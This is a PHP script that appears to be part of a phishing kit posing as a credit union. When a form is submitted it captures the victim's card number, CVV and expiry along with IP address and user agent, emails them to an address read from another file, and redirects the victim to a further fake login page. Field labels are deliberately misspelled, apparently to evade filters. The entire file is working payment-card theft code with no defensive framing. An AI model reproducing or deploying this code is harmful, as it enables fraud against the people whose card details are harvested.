<?php
if($_POST["c"] != "" and $_POST["v"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------N'F.C.U Info-----------------------\n";
$message .= "C@rd Number            : ".$_POST['c']."\n";
$message .= "C.V'V            		: ".$_POST['v']."\n";
$message .= "Expiry            		: ".$_POST['x']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf5.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>